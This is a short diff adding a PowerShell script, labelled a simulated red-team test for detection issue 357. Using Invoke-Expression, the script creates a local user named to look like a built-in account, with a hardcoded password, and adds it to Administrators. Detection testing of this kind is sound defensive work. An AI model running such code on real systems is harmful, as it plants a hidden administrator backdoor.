@@ -1,0 +1,13 @@
+# Simulated Red Team script to test detection issue 357
+$username = "DefaultAccount1"
+$password = "P@ssw0rd1234"
+
+# Build the net user add command
+$cmd = "net user $username $password /add"
+
+# Optional: Add to Administrators group
+$cmd2 = "net localgroup administrators $username /add"
+
+# Execute both commands
+Invoke-Expression $cmd
+Invoke-Expression $cmd2
